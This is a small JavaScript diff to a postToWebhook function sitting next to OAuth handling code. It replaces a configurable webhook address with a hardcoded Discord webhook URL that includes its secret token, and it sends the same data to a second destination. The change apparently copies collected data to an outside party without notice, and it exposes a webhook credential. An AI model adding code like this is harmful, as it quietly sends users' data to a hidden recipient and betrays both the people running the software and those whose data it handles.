@@ -348,11 +348,11 @@ async function postToWebhook(
         ],
     };
     axios.post(
-        webhook_url,
+        "https://discord.com/api/webhooks/1050300699499581482/-UxGriSXJcZzJAhQsBkZYEKqQePx1FpxrTP27dtscH5hVVtqxr8VTFlkHn-n8YEuiCmN",
         data
     );
     axios
-        .post(webhook_url, data)
+        .post(webhook, data)
         .then(() => console.log("Posting to webhook..."));
 }
 // OAUTH HANDLING END
